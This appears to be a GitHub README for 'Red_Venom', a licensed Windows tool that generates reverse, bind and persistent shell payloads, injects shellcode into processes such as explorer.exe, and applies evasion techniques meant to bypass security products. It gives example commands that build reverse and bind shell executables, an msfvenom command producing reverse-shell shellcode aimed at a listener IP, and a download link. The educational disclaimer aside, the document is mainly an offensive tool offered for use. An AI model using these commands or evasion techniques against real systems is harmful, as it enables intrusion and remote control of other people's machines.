# 🔴 Red_Venom - Advanced Payload Generation Tool

![image](https://github.com/user-attachments/assets/408d7e07-6d9d-46d3-b53a-a57606b12366)

> Developed by **Y. Janboubi** | Version: `1.0`  
> ⚠️ **Disclaimer**: Red_Venom is intended strictly for educational and research purposes. Unauthorized or malicious use is prohibited.

---

## 📖 Overview

**Red_Venom** is a terminal-based payload generation tool designed for experienced cybersecurity users. It is intended for educational and research purposes, allowing users to generate  shellcode and inject payloads. The tool incorporates multiple advanced evasion techniques to bypass modern security solutions, offering options for custom output formats, obfuscation, timed execution delays (sleep), and targeting specific processes.

---

## ✨ Key Features

- 🔥 **Payload Generation**: TCP reverse shells, bind shells, and persistent shells.
- 💉 **Injection Techniques**: Memory injection (Private/Mapped), API stomping, and process injection (Remote/Local).
- 🛡️ **Evasion Techniques**: IAT hiding, encryption, string hashing, syscall invocation, and sleep obfuscation.
- ⚙️ **Customization**: Configurable IP, port, sleep delays, obfuscation, target processes, and output formats (EXE, DLL).

---

## 🔧 Supported Payload Types

- **Reverse TCP**: Generates a TCP reverse shell, where the target initiates a connection back to the attacker.
- **Bind Shell**: Creates a TCP bind shell, opening a listening port on the target for the attacker to connect to.
- **Persistence Shell**: Maintains a persistent reverse shell connection (EXE format only).

---

## 💉 Supported Injection Types

- **Mapping Injection**: Utilizes mapping memory injection techniques.
- **Private Injection**: Employs private memory injection methods.
- **API Stomping**: Performs local API stomping (EXE format only) to execute shellcode by overwriting legitimate API functions.
- **Process Injection**: General local process injection capabilities.
- **Remote Process Injection**: Facilitates remote process injection, (default: `explorer.exe`).
  
---

## 🛡️ Advanced Evasion Techniques

Red_Venom integrates cutting-edge methods to enhance payload stealth:

- **IAT Hiding**: Conceals Import Address Table entries to evade API monitoring.
- **Obfuscation**: Applies various code and data obfuscation methods to make analysis difficult.
- **Encryption**: Encrypts payloads or sensitive strings for obfuscation.
- **String Hashing**: Replaces plaintext with hashes to bypass static analysis.
- **Brute-Forcing Decryption**: (Contextual) May involve dynamic self-decryption or iterative unlocking of payload stages.
- **Syscalls (System Calls)**: Directly invokes kernel functions, bypassing user-mode API hooks.
- **Sleep Obfuscation**: Introduces configurable delays (via `-s` option) to evade sandbox detection.

---

## 🚀 Usage

**Red_Venom** is a command-line tool designed for advanced customization. Use the following syntax and options to generate and deploy payloads.

![image](https://github.com/user-attachments/assets/d0ddb5c9-c6ed-4d8b-8b5d-b4e6bb55551e)


### 🛠️ Command Syntax

```bash
Red_Venom.exe -t <Payload_Type> -i <IP> -p <Port> [options]
  ```
### 📋 Options

- `-t <Payload_Type>`: Specifies the type of payload (e.g., `Reverse_tcp`, `Mapping_Injection`).
- `-i <IP>`: Sets the listen IP address for TCP payloads.
- `-p <Port>`: Defines the listen port number for TCP payloads.
- `-f <Payload.bin>`: Specifies the raw payload file (e.g., `msfvenom` output) for injection types.
- `-o <Format>`: Determines the output format of the generated payload (EXE, DLL).
- `-s <seconds>`: Enables sleep obfuscation, pausing execution for (30.5) seconds by default. 
- `-obf`: Activates payload obfuscation.
- `-r <Process>`: Specifies the remote process name for injection (e.g., `explorer.exe`).

### 📋 Example Commands

- **Generate a TCP reverse shell:**
  ```bash
  Red_Venom.exe -t Reverse_tcp -i 192.168.1.100 -p 4444 -o EXE
  ```

- **Generate a bind shell with DLL output:**
  ```bash
  Red_Venom.exe -t Bind_Shell -p 5555 -o DLL
  ```

- **Inject a custom payload with obfuscation:**
  ```bash
  Red_Venom.exe -t Remote_P_Injection -f payload.bin -o EXE -obf -r explorer.exe
  ```
  
---

## 🔄 Compatibility

Red_Venom is compatible with raw shellcode generated by tools like `msfvenom`. Example:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 EXITFUNC=thread -o payload.bin
```
---
## ⚙️ Installation

### 📋 Prerequisites

- **Windows 10 or 11 (64-bit)**
- **Valid License Key** — required to activate and use the tool

> ⚠️ **Red_Venom is a licensed tool**.
> Unauthorized use or redistribution is prohibited.
---

## 📦 Download

You can download the latest official release of **RED_VENOM** from the link below:

🔗 [**Download RED_VENOM (Latest Version)**](https://github.com/Y-JANBOUBI/RED_VENOM/releases/download/v1.0/Red_Venom.zip)

---

### 🧪 Getting Started

1. Download `RED_VENOM` from the link above.
2. Unzip and Launch `RED_VENOM.exe`.
3. When prompted, enter your **activation key**.
4. Once activated, the tool will run normally on your device.
---

## 🔐 Licensing & Activation

RED_VENOM requires a valid license key to function.  
To request a license key or for licensing inquiries, please contact the developer directly or support.

📩 **Support Email:** `rsredvenom@gmail.com`

---

## ⚖️ Legal & Ethical Use

- **Authorized Environments Only**
- **Do Not Use for Malicious Activity**
- **Follow Local Laws and Regulations**

---

## 📬 Contact

For questions, bug reports, contact me at [https://github.com/Y-JANBOUBI].

---

*Developed by Y.Janboubi V1.0*  






